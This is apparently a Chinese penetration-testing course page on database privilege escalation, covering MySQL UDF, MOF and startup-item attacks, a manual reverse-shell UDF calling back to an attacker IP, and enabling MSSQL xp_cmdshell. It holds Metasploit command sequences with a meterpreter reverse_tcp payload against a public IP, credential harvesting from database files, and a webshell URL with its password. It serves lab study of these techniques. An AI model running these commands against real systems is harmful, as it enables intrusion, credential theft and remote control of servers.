<p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104710312.png" alt="image-20230419104710312"></p>
<h6 id="如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来"><a href="#如果获取了网站权限，通过数据库的这几个文件中，一般是user-MYD文件，下载下来" class="headerlink" title="如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来"></a>如果获取了网站权限，通过数据库的这几个文件中，一般是user.MYD文件，下载下来</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104149953.png" alt="image-20230419104149953"></p>
<h6 id="打开这个文件，可以看到加密后的密码，MD5网站解密即可"><a href="#打开这个文件，可以看到加密后的密码，MD5网站解密即可" class="headerlink" title="打开这个文件，可以看到加密后的密码，MD5网站解密即可"></a>打开这个文件，可以看到加密后的密码，MD5网站解密即可</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104224588.png" alt="image-20230419104224588"></p>
<h6 id="还可以查看配置文件"><a href="#还可以查看配置文件" class="headerlink" title="还可以查看配置文件"></a>还可以查看配置文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104843766.png" alt="image-20230419104843766"></p>
<h6 id="打开就可以看到用户密码"><a href="#打开就可以看到用户密码" class="headerlink" title="打开就可以看到用户密码"></a>打开就可以看到用户密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419104901451.png" alt="image-20230419104901451"></p>
<h4 id="MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell"><a href="#MYSQL-UDF-amp-MOF-amp-启动项-amp-反弹Shell" class="headerlink" title="#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell"></a>#MYSQL-UDF&amp;MOF&amp;启动项&amp;反弹Shell</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p>
<h4 id="4种方法"><a href="#4种方法" class="headerlink" title="4种方法"></a>4种方法</h4><h4 id="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"><a href="#都建立在数据库开启了写入文件的功能上，即secure-file-priv开启" class="headerlink" title="都建立在数据库开启了写入文件的功能上，即secure-file-priv开启"></a>都建立在数据库开启了写入文件的功能上，即secure-file-priv开启</h4><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114724609.png" alt="image-20230419114724609"></p>
<h5 id="方法1、UDF"><a href="#方法1、UDF" class="headerlink" title="方法1、UDF"></a>方法1、UDF</h5><h6 id="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"><a href="#获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续" class="headerlink" title="获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续"></a>获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续</h6><ul>
<li><h6 id="mysql-lt-5-2-导出目录c-x2F-windows或system32"><a href="#mysql-lt-5-2-导出目录c-x2F-windows或system32" class="headerlink" title="mysql&lt;5.2 导出目录c:&#x2F;windows或system32"></a>mysql&lt;5.2 导出目录c:&#x2F;windows或system32</h6></li>
<li><h6 id="mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F"><a href="#mysql-x3D-gt-5-2-导出安装目录-x2F-lib-x2F-plugin-x2F" class="headerlink" title="mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;"></a>mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</h6></li>
<li><p>查看版本：select version()   查看安装目录：select @@basedir</p>
</li>
<li><p>开启数据库外连：</p>
<p><code>GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION;</code></p>
<p><code>FLUSH PRIVILEGES;（刷新）</code></p>
</li>
<li><p>关闭数据库外连：</p>
<p><code>UPDATE mysql.user SET Host=&#39;localhost&#39; WHERE User=&#39;root&#39; AND Host=&#39;%&#39;;</code><br><code>FLUSH PRIVILEGES;（刷新</code>）</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12992355.html">开启mysql外部访问(root外连) - My_Dreams - 博客园 (cnblogs.com)</a></p>
</li>
<li><p>没有目录采用手工创建plugin目录或利用NTFS流创建 </p>
</li>
<li><p>使用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload 模块可以进行UDF提权,</p>
</li>
<li><p>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p>
</li>
</ul>
<h6 id="用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库"><a href="#用哥斯拉连接数据库-因为木马在其本地，所以可以连接数据库" class="headerlink" title="用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)"></a>用哥斯拉连接数据库(因为木马在其本地，所以可以连接数据库)</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013644140.png" alt="image-20230420013644140"></p>
<h6 id="但是外部软件尝试连接，会拒绝，原因是没有开启外连"><a href="#但是外部软件尝试连接，会拒绝，原因是没有开启外连" class="headerlink" title="但是外部软件尝试连接，会拒绝，原因是没有开启外连"></a>但是外部软件尝试连接，会拒绝，原因是没有开启外连</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230420013821125.png" alt="image-20230420013821125"></p>
<h6 id="先判断数据库的版本"><a href="#先判断数据库的版本" class="headerlink" title="先判断数据库的版本"></a>先判断数据库的版本</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105424511.png" alt="image-20230419105424511"></p>
<h6 id="用sql语句查看安装目录"><a href="#用sql语句查看安装目录" class="headerlink" title="用sql语句查看安装目录"></a>用sql语句查看安装目录</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105520677.png" alt="image-20230419105520677"></p>
<h6 id="然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用"><a href="#然后进入这个lib-x2F-plugin目录-没有目录采用手工创建plugin-然后msf进行利用" class="headerlink" title="然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用"></a>然后进入这个lib&#x2F;plugin目录,没有目录采用手工创建plugin,然后msf进行利用</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105625537.png" alt="image-20230419105625537"></p>
<h5 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h5><h5 id="先MSF-（前提先开外链）"><a href="#先MSF-（前提先开外链）" class="headerlink" title="先MSF:（前提先开外链）"></a>先MSF:（前提先开外链）</h5><ul>
<li><h6 id="这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"><a href="#这里是用msf在lib-x2F-plugin目录自动生成dll文件，也可以手工创建dll文件然后上传" class="headerlink" title="这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传"></a>这里是用msf在lib&#x2F;plugin目录自动生成dll文件，也可以手工创建dll文件然后上传</h6></li>
<li><p>可能出现的问题及原因：</p>
</li>
<li><p><strong>1、</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shanmao/p/12045560.html">Exploit completed, but no session was created. - 山貓 - 博客园 (cnblogs.com)</a></p>
</li>
<li><p><strong>2、</strong>msf创建的sys_exec()函数无回显，得创建sys_eval()才有回显：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84863268">MySQL UDF提权执行系统命令_谢公子mysql提权_谢公子的博客-CSDN博客</a></p>
</li>
<li><p>常规执行如下：</p>
</li>
<li><p>use exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload</p>
</li>
<li><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
</li>
<li><p>set password root</p>
</li>
<li><p>set rhosts 47.102.195.100</p>
</li>
<li><p>run</p>
</li>
</ul>
<h5 id="接着Navicat实现"><a href="#接着Navicat实现" class="headerlink" title="接着Navicat实现:"></a>接着Navicat实现:</h5><ul>
<li><h6 id="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"><a href="#（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）" class="headerlink" title="（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）"></a>（也可以在哥斯拉里面执行语句，Navicat属于别的主机，要开启了外连的情况下才能连接数据库）</h6></li>
<li><p>手动可能出现的问题：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】 - FreeBuf网络安全行业门户</a></p>
</li>
<li><p>开外联后使用MSF导出，在执行后续命令调用执行</p>
</li>
<li><p>select * from mysql.func where name &#x3D; “sys_exec”; &#x2F;&#x2F;查看</p>
</li>
<li><p>create function sys_eval returns string soname “IpKFJktF.dll”;&#x2F;&#x2F;创建函数绑定dll，linux里面是.so文件</p>
</li>
<li><p>select sys_eval(“whoami”);&#x2F;&#x2F;调用函数进行命令执行</p>
</li>
</ul>
<h6 id="演示上述："><a href="#演示上述：" class="headerlink" title="演示上述："></a>演示上述：</h6><h6 id="选择模块后show-options"><a href="#选择模块后show-options" class="headerlink" title="选择模块后show options"></a>选择模块后show options</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419105839820.png" alt="image-20230419105839820"></p>
<h6 id="按照命令往下敲"><a href="#按照命令往下敲" class="headerlink" title="按照命令往下敲"></a>按照命令往下敲</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110437759.png" alt="image-20230419110437759"></p>
<h6 id="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"><a href="#这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下" class="headerlink" title="这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下"></a>这里run之前，要确保数据库是支持外连的，不然无法利用，发现不支持外连，打开外连sql语句如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110238004.png" alt="image-20230419110238004"></p>
<h6 id="执行完后发现有个-，这表明任意主机都可以连接这个数据库"><a href="#执行完后发现有个-，这表明任意主机都可以连接这个数据库" class="headerlink" title="执行完后发现有个%，这表明任意主机都可以连接这个数据库"></a>执行完后发现有个%，这表明任意主机都可以连接这个数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419110318452.png" alt="image-20230419110318452"></p>
<h6 id="然后run"><a href="#然后run" class="headerlink" title="然后run"></a>然后run</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419111222983.png" alt="image-20230419111222983"></p>
<h6 id="随后会在目录下产生一个dll文件"><a href="#随后会在目录下产生一个dll文件" class="headerlink" title="随后会在目录下产生一个dll文件"></a>随后会在目录下产生一个dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003605333.png" alt="image-20230421003605333"></p>
<h6 id="也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令"><a href="#也可以通过sql查询找到sys-exec和这个dll文件绑定了，可以通过sys-exec来执行命令" class="headerlink" title="也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令"></a>也可以通过sql查询找到sys_exec和这个dll文件绑定了，可以通过sys_exec来执行命令</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003918467.png" alt="image-20230421003918467"></p>
<h6 id="但是用sys-exec来-执行命令，会没有回显，只会显示数字"><a href="#但是用sys-exec来-执行命令，会没有回显，只会显示数字" class="headerlink" title="但是用sys_exec来 执行命令，会没有回显，只会显示数字"></a>但是用sys_exec来 执行命令，会没有回显，只会显示数字</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421003010588.png" alt="image-20230421003010588"></p>
<h6 id="所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显"><a href="#所以这里用Navicat先连接数据库-或者哥斯拉直接执行-，将这个sys-eval也绑定这个dll文件，因为sys-eval有回显" class="headerlink" title="所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显"></a>所以这里用Navicat先连接数据库(或者哥斯拉直接执行)，将这个sys_eval也绑定这个dll文件，因为sys_eval有回显</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230421084408478.png" alt="image-20230421084408478"></p>
<h6 id="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"><a href="#现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线" class="headerlink" title="现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线"></a>现在就可以执行命令了并且有回显内容，从而可以执行命令实现远控上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419112019984.png" alt="image-20230419112019984"></p>
<h5 id="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"><a href="#方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）" class="headerlink" title="方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）"></a>方法2、MOF-Win2008后权限控制导致无效-MSF演示（成功几率不高）</h5><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p>
<p>MSF：use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</p>
<h5 id="方法3、启动项"><a href="#方法3、启动项" class="headerlink" title="方法3、启动项"></a>方法3、启动项</h5><p>MSF：（前提先开外链）</p>
<p>use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p>
<p>set rhosts 47.102.195.100</p>
<p>set username root</p>
<p>set password root</p>
<p>run</p>
<h6 id="一开始启动目录为空"><a href="#一开始启动目录为空" class="headerlink" title="一开始启动目录为空"></a>一开始启动目录为空</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113058689.png" alt="image-20230419113058689"></p>
<h6 id="执行上面的msf命令后在启动项生成了一个exe木马"><a href="#执行上面的msf命令后在启动项生成了一个exe木马" class="headerlink" title="执行上面的msf命令后在启动项生成了一个exe木马"></a>执行上面的msf命令后在启动项生成了一个exe木马</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113224884.png" alt="image-20230419113224884"></p>
<h6 id="如下，因为是启动项，所以要在其启动的时候才会执行上线"><a href="#如下，因为是启动项，所以要在其启动的时候才会执行上线" class="headerlink" title="如下，因为是启动项，所以要在其启动的时候才会执行上线"></a>如下，因为是启动项，所以要在其启动的时候才会执行上线</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419113242356.png" alt="image-20230419113242356"></p>
<h5 id="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"><a href="#方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）" class="headerlink" title="方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）"></a>方法4、反弹Shell（手动创建dll，原理和UDF一样，只是将执行的payload一步步传参数最后绑定dll文件）</h5><p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43801718/article/details/105493042">Mysql提权之反弹shell_mysql反弹shell_周雄雄的博客-CSDN博客</a></p>
<ul>
<li>use mysql;</li>
<li>set @a&#x3D;concat(‘’,</li>
<li>create table Ghost(data LONGBLOB);</li>
<li>insert into Ghost values(“”);update Ghost set data &#x3D; @a;（values双引号里面填payload语句如下，可在上面的链接中复制）</li>
<li>select data from Ghost into DUMPFILE ‘C:\phpstudy\PHPTutorial\MySQL\lib\plugin\udf.dll’;</li>
<li>create function backshell returns string soname ‘udf.dll’;</li>
<li>select backshell(‘攻击机ip’,7788)</li>
</ul>
<h6 id="将上面的sql语句执行"><a href="#将上面的sql语句执行" class="headerlink" title="将上面的sql语句执行"></a>将上面的sql语句执行</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114334282.png" alt="image-20230419114334282"></p>
<h6 id="攻击机上面监听7788端口，收到shell反弹"><a href="#攻击机上面监听7788端口，收到shell反弹" class="headerlink" title="攻击机上面监听7788端口，收到shell反弹"></a>攻击机上面监听7788端口，收到shell反弹</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114308571.png" alt="image-20230419114308571"></p>
<h6 id="可以看到生成了udf-dll文件"><a href="#可以看到生成了udf-dll文件" class="headerlink" title="可以看到生成了udf.dll文件"></a>可以看到生成了udf.dll文件</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419114422784.png" alt="image-20230419114422784"></p>
<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><h6 id="上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下"><a href="#上面的操作都需要secure-file-priv开启，如果子啊my-ini文件里面将其删除，如下" class="headerlink" title="上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下"></a>上面的操作都需要secure_file_priv开启，如果子啊my.ini文件里面将其删除，如下</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115033927.png" alt="image-20230419115033927"></p>
<h6 id="再次写入文件时，将会失败"><a href="#再次写入文件时，将会失败" class="headerlink" title="再次写入文件时，将会失败"></a>再次写入文件时，将会失败</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419115142477.png" alt="image-20230419115142477"></p>
<h3 id="MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒"><a href="#MSSQL-xp-cmdshell-amp-sp-oacreate-amp-沙盒" class="headerlink" title="#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>#MSSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h3><p>已知Shell：<a target="_blank" rel="noopener" href="http://192.168.46.147:82/cd.aspx">http://192.168.46.147:82/cd.aspx</a> 密码x</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_11797152/2411770">SQL Server提权方法汇总（MSSQL）_Margin的技术博客_51CTO博客</a></p>
<h5 id="1-使用xp-cmdshell进行提权"><a href="#1-使用xp-cmdshell进行提权" class="headerlink" title="1.使用xp_cmdshell进行提权"></a>1.使用xp_cmdshell进行提权</h5><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140838630.png" alt="image-20230419140838630"></p>
<p>这个也可以进行命令执行</p>
<p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419140938173.png" alt="image-20230419140938173"></p>
<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p>
<h5 id="启用："><a href="#启用：" class="headerlink" title="启用："></a>启用：</h5><ul>
<li>EXEC sp_configure ‘show advanced options’, 1</li>
<li>RECONFIGURE;</li>
<li>EXEC sp_configure ‘xp_cmdshell’, 1;</li>
<li>RECONFIGURE;</li>
</ul>
<h5 id="关闭："><a href="#关闭：" class="headerlink" title="关闭："></a>关闭：</h5><ul>
<li>exec sp_configure ‘show advanced options’, 1;</li>
<li>reconfigure;</li>
<li>exec sp_configure ‘xp_cmdshell’, 0;</li>
<li>reconfigure;</li>
</ul>
<h5 id="执行："><a href="#执行：" class="headerlink" title="执行："></a>执行：</h5><ul>
<li>EXEC master.dbo.xp_cmdshell ‘命令’</li>
<li>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</li>
<li>exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</li>
</ul>
<h6 id="同样在配置文件中查看数据库的账号密码"><a href="#同样在配置文件中查看数据库的账号密码" class="headerlink" title="同样在配置文件中查看数据库的账号密码"></a>同样在配置文件中查看数据库的账号密码</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141152054.png" alt="image-20230419141152054"></p>
<h6 id="Navicat连接数据库"><a href="#Navicat连接数据库" class="headerlink" title="Navicat连接数据库"></a>Navicat连接数据库</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141434996.png" alt="image-20230419141434996"></p>
<h6 id="执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’"><a href="#执行命令-EXEC-master-dbo-xp-cmdshell-‘命令’" class="headerlink" title="执行命令 EXEC master.dbo.xp_cmdshell ‘命令’"></a>执行命令 EXEC master.dbo.xp_cmdshell ‘命令’</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141347982.png" alt="image-20230419141347982"></p>
<h6 id="倘若执行命令将xp-cmshell设置为0关闭"><a href="#倘若执行命令将xp-cmshell设置为0关闭" class="headerlink" title="倘若执行命令将xp_cmshell设置为0关闭"></a>倘若执行命令将xp_cmshell设置为0关闭</h6><p><img src="/../images/Day99-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96-MYSQL-MSSQL-Oracle-MSF/image-20230419141637395.png" alt="image-20230419141637395"></p>
